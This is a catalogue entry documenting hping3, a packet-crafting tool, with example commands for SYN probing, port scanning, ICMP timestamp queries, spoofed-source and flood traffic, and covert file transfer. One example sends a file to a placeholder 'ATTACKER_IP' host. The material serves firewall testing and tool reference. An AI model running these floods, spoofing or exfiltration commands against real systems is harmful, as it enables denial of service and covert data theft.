---
name: "hping"
categories:
  - networking
homepage: "https://github.com/antirez/hping"
github-repo: "antirez/hping"
github-match: "exact"
origin: "awesome-pentest"
recipe: "upstream"
license: GPL2
github-stars: 1731
github-pushed: "2024-07-10"
github-commits-year: 0
gh-checked: "2026-11-14"
worth: 3.4
worth-basis: "full (activity+popularity+recency+adoption)"
packaged-by: [arch, kali, nixpkgs]
---

# hping

> antirez's classic command-line packet crafter — assemble and send TCP/UDP/ICMP/raw-IP packets with arbitrary flags, headers, and payloads, then watch the replies.

## What it's for

hping3 sends hand-crafted packets at a target and prints every reply — half ping, half scalpel. Every header field is settable (TCP flags, window, TTL, fragmentation, source address, data payload from a file), which makes it the traditional tool for firewall and IDS rule testing, idle/scanner-adjacent techniques, SYN scanning, traceroute experiments, protocol-stack stress, and covert file transfer through ping packets. It is a frozen classic: development stopped in December 2014 (the last master commit), and the repo has seen only a stray non-master touch since — admitted as a below-gate dormant-famous rescue on owner call. Distros keep it alive (Arch `hping`, Kali/Debian `hping3`, nixpkgs `hping`), so the packaged builds, not the repo, are the way to run it. It also ships a TCL scripting mode for stateful send/receive logic. Needs root (raw sockets).

No corpus evidence — derived from upstream documentation (man page of the packaged build).

## Typical use cases

### Probe a port with a SYN (firewall-friendly ping)

```
sudo hping3 -S -p 80 target.example.com -c 3
```

Outcome: three SYN packets to port 80 with per-packet reply lines (flags, TTL, seq, RTT) — SA means open, RA means closed, silence means filtered; with no flags set at all hping's default null-TCP to port 0 is the classic stealth host probe.

### SYN-scan a port range

```
sudo hping3 --scan 1-1000,8888,known -S target.example.com
```

Outcome: scan-mode SYN scan of ports 1-1000 plus 8888 plus everything in /etc/services, summarized as open/closed/filtered — `all` aliases 0-65535 and `!known` subtracts, so `'1-1024,!known'` inverts the list.

### Send ICMP timestamp requests

```
sudo hping3 -1 --icmp-ts target.example.com
```

Outcome: ICMP mode with timestamp (type 13) requests instead of echo — the reply's originate/receive/transmit timestamps leak the target's clock, an input for protocol trust analyses.

### Stress firewall state tables with random sources

```
sudo hping3 --rand-source -S -p 80 target.example.com
```

Outcome: packets from ever-changing spoofed source IPs (`-a 198.51.100.10` pins a single fake source instead) — the documented way to stress per-source dynamic tables in firewalls and TCP/IP stacks; expect replies to go nowhere but the target's logs to fill.

### Move a file through ping/UDP packets

```
sudo hping3 ATTACKER_IP --udp -p 53 -d 100 --sign mysecret --safe --file notes.txt
sudo hping3 target.example.com --listen mysecret --safe --icmp
```

Outcome: the sender chops `notes.txt` into 100-byte bodies signed `mysecret` (lost packets resent thanks to `--safe`); the receiver in listen mode reassembles and prints the file content after the signature — covert-channel file transfer between two hosts you control.

### Traceroute while pinning one hop

```
sudo hping3 target.example.com --traceroute --ttl 5 --tr-keep-ttl
```

Outcome: traceroute mode that holds TTL at 5 (`--tr-keep-ttl`) so you can monitor a single hop's behavior over time instead of walking the whole path; `-t 1 --traceroute` starts the classic per-hop walk.

### Flood a lab target

```
sudo hping3 --flood -S -p 80 target.example.com
```

Outcome: packets as fast as the host can send them, replies not printed — for DoS-mitigation testing against your own infrastructure only (`--fast`/`--faster`/`-i u10000` give controlled rates instead).
